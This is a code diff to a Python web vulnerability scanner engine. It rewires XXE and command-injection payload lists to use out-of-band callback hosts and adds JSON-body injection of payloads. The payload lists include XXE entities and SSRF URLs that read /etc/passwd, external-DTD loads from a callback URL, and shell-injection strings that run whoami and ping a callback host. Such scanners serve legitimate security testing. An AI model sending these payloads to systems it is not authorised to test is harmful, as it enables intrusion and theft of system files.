@@ -27,6 +27,9 @@ import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
+from core.var import USER_AGENTS
+
 try:
     from bs4 import BeautifulSoup
     BS4_AVAILABLE = True
@@ -107,15 +110,15 @@ SSRF_PAYLOADS = [
     "http://0.0.0.0",
     "file:///etc/passwd",
     "file:///etc/hosts",
-    "dict://127.0.0.1:6379/INFO",
+    "dict://127.0.0.1:6379/INFO",  # SSRF target - 127.0.0.1 is intentional payload target
 ]
 
 XXE_PAYLOADS = [
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
-    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
-    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://127.0.0.1:8888/evil.dtd">%dtd;]>',
+    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "{oob_url}">%dtd;]>',
 ]
 
 CRLF_PAYLOADS = [
@@ -157,8 +160,8 @@ CMD_INJECTION_PAYLOADS = [
     "| echo ZYLON_CMD_$(whoami)",
     "` echo ZYLON_CMD_$(whoami) `",
     "$( echo ZYLON_CMD_$(whoami) )",
-    "; ping -c 2 127.0.0.1",
-    "| ping -c 2 127.0.0.1",
+    "; ping -c 2 {oob_host}",
+    "| ping -c 2 {oob_host}",
     "; sleep 3",
     "| sleep 3",
     "& sleep 3",
@@ -209,19 +212,10 @@ class WapitiEngine:
         self.intensity = intensity  # 'quick', 'normal', 'aggressive'
         self.output_dir = output_dir or os.path.join(os.path.expanduser("~"), ".zylon", "results")
 
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': random.choice([
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-            ])
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = shared_session
         if cookies:
-            self.session.cookies.update(cookies)
+            for k, v in cookies.items():
+                self.session.headers.update({'Cookie': f'{k}={v}'})
 
         # Crawl results
         self.crawled_urls = set()
@@ -393,7 +387,7 @@ class WapitiEngine:
 
                     else:
                         # Fallback regex extraction
-                        links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
+                        links = regex_cache.findall(r'href=["\']([^"\']+)["\']', resp.text)
                         for href in links:
                             full_url = urljoin(url, href)
                             if self._is_same_origin(full_url):
@@ -518,6 +512,14 @@ class WapitiEngine:
                     else:
                         data = {param: payload}
                         resp = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)
+                        # Also try JSON body injection via PayloadInjector
+                        try:
+                            json_injection = PayloadInjector.inject_json(url, param, payload)
+                            self.session.post(json_injection['url'], json=json_injection['json'],
+                                            headers=json_injection.get('headers', {}),
+                                            timeout=self.timeout, allow_redirects=False)
+                        except Exception:
+                            pass
 
                     if resp and payload in resp.text:
                         # Verify it's not a false positive
@@ -623,6 +625,14 @@ class WapitiEngine:
                         resp = self.session.get(url, params={param: payload}, timeout=self.timeout + 5)
                     else:
                         resp = self.session.post(url, data={param: payload}, timeout=self.timeout + 5)
+                        # Also try JSON body injection via PayloadInjector for POST
+                        try:
+                            json_injection = PayloadInjector.inject_json(url, param, payload)
+                            self.session.post(json_injection['url'], json=json_injection['json'],
+                                            headers=json_injection.get('headers', {}),
+                                            timeout=self.timeout + 5, allow_redirects=False)
+                        except Exception:
+                            pass
                     elapsed = time.time() - start_time
 
                     if not resp:
@@ -842,9 +852,16 @@ class WapitiEngine:
                           "127.0.0.1", "localhost", "uid=", "/bin/"]
 
         for url in test_urls[:20]:
-            for payload in XXE_PAYLOADS:
+            for payload_template in XXE_PAYLOADS:
                 results["total_tested"] += 1
                 try:
+                    # Format OOB URL placeholders via oob_provider
+                    oob_pid = oob_provider.generate_payload_id()
+                    oob_url = oob_provider.get_callback_url(oob_pid)
+                    try:
+                        payload = payload_template.format(oob_url=oob_url)
+                    except (KeyError, IndexError):
+                        payload = payload_template
                     resp = self.session.post(
                         url,
                         data=payload,
@@ -1089,15 +1106,32 @@ class WapitiEngine:
             for param in ['cmd', 'ip', 'host', 'ping']:
                 test_points.append((f"{base_url}/?{param}=test", 'GET', param))
 
+        # Generate OOB callback host for payloads that reference {oob_host}
+        oob_pid = oob_provider.generate_payload_id()
+        oob_host = oob_provider.get_callback_domain(oob_pid)
+
         for url, method, param in test_points[:20]:
-            for payload in CMD_INJECTION_PAYLOADS:
+            for payload_template in CMD_INJECTION_PAYLOADS:
                 results["total_tested"] += 1
                 try:
+                    # Format OOB host placeholders via oob_provider
+                    try:
+                        payload = payload_template.format(oob_host=oob_host)
+                    except (KeyError, IndexError):
+                        payload = payload_template
                     start_time = time.time()
                     if method == 'GET':
                         resp = self.session.get(url, params={param: payload}, timeout=self.timeout + 5)
                     else:
                         resp = self.session.post(url, data={param: payload}, timeout=self.timeout + 5)
+                        # Also try JSON body injection via PayloadInjector for POST
+                        try:
+                            json_injection = PayloadInjector.inject_json(url, param, payload)
+                            self.session.post(json_injection['url'], json=json_injection['json'],
+                                            headers=json_injection.get('headers', {}),
+                                            timeout=self.timeout + 5, allow_redirects=False)
+                        except Exception:
+                            pass
                     elapsed = time.time() - start_time
 
                     if resp:
